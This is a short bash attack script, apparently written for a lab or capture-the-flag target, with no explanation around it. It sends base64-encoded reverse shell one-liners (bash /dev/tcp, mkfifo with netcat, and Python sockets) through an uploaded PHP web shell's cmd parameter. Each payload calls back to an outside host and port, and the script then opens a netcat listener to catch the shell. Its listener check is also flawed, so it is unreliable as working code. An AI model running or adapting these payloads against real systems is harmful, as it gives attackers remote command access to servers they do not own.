#!/bin/bash

# Reverse shell IP and port
ip="10.10.16.9"
port="4000"

# Server URL and command
url="http://192.168.0.166/AppSec/uploads/test123-shell2.php?cmd="

# Reverse shell commands to try
commands=(
    "bash -i >& /dev/tcp/$ip/$port 0>&1"
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
)

# Encode command for URL
function encode_cmd {
    local cmd="$1"
    echo $(echo "$cmd" | base64 | tr -d '\n')
}

# Try each reverse shell command
for cmd in "${commands[@]}"
do
    encoded_cmd=$(encode_cmd "$cmd")
    echo "Trying command: $cmd"
    curl -s "${url}${encoded_cmd}" > /dev/null
    nc -nlp $port &
    sleep 1
    if [ "$(ps -ef | grep "nc -nlp $port" | grep -v grep | wc -l)" -ne "0" ]
    then
        echo "Reverse shell connection established!"
        nc -nlvp $port
        exit 0
    else
        echo "Reverse shell connection not established."
    fi
done

echo "Unable to establish reverse shell connection."
